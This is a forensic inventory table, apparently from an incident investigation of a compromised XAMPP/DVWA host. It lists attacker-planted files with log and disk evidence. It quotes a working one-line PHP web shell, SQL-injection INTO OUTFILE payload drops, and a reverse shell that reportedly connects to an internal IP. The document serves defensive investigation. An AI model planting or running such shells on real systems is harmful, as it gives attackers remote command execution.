# Bonus inventory: attacker-added directories and files

The table below lists paths that were created or planted by the attacker(s), with proof from disk metadata and/or Apache log evidence.

| Path | Type | Proof |
| --- | --- | --- |
| `/xampp/htdocs/tmpukudk.php` | temporary PHP payload file | Apache access log shows `INTO OUTFILE '/xampp/htdocs/tmpukudk.php'` during sqlmap exploitation, followed by a request to `/tmpukudk.php`. |
| `/xampp/htdocs/tmpbiwuc.php` | temporary PHP payload file | Apache access log shows command execution through `/tmpbiwuc.php?cmd=echo command execution test`. |
| `/xampp/htdocs/tmpudvfh.php` | temporary PHP payload file | Apache access log shows `INTO OUTFILE` writing `/xampp/htdocs/tmpudvfh.php`, followed by a request to `/tmpudvfh.php`. |
| `/xampp/htdocs/tmpbrjvl.php` | temporary PHP payload file | Apache access log shows command execution through `/tmpbrjvl.php?cmd=echo command execution test`. |
| `/xampp/htdocs/DVWA/webshell.php` | web shell file | On disk, file contents are `<?php system($_GET["cmd"]); ?>`; it is present in the DVWA tree and matches the webshell activity. |
| `/xampp/htdocs/DVWA/webshells.zip` | archive of web shells | On disk, the ZIP contains `c99.php` and `webshell.php`; its timestamp matches the compromise window. |
| `/xampp/htdocs/DVWA/webshells/` | directory | On disk metadata shows the directory was created on 2015-09-03 07:14:51 UTC. |
| `/xampp/htdocs/DVWA/c99.php` | web shell file | On disk metadata shows the file exists in the DVWA tree; Apache logs show `c99.php` being loaded and its command interface used. |
| `/xampp/htdocs/DVWA/hackable/uploads/phpshell.php` | uploaded web shell | Apache logs show `/dvwa/hackable/uploads/phpshell.php` used as a web shell; on disk the file exists in the uploads directory. |
| `/xampp/htdocs/DVWA/hackable/uploads/phpshell2.php` | uploaded reverse shell | Apache logs show `/dvwa/hackable/uploads/phpshell2.php` being fetched; on disk the file contents connect to `192.168.56.102:4545`. |
| `/xampp/htdocs/DVWA/hackable/uploads/abc/` | attacker-created directory | Apache logs show the attacker creating `abc` through the uploaded web shell; on disk metadata shows the directory timestamped 2015-09-03 07:17:58 UTC. |
| `/xampp/passwords.txt` | informational file | On disk, this XAMPP-provided file contains default credential notes and was present in the web stack tree; it is not attacker-made but is a notable leftover. |

## Notes
- The strongest attacker-created leftovers are the web shells and temp PHP payloads in `/xampp/htdocs/` and `/xampp/htdocs/DVWA/`.
- Some transient SQLi payload files were written and then deleted; their proof survives in Apache access log entries rather than on disk.
- If the final report needs a strict attacker-added-only list, omit `/xampp/passwords.txt` because it is baseline software material, not a hostile drop.
